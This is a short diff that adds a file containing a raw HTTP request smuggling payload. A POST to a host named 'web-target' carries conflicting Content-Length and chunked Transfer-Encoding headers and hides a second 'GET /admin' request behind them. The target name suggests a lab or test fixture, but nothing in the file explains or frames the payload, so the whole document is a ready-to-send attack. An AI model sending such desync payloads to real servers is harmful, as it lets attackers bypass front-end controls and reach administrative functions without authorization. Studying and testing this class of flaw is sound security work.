@@ -1,0 +1,10 @@
+POST / HTTP/1.1
+Host: web-target
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: web-target
+
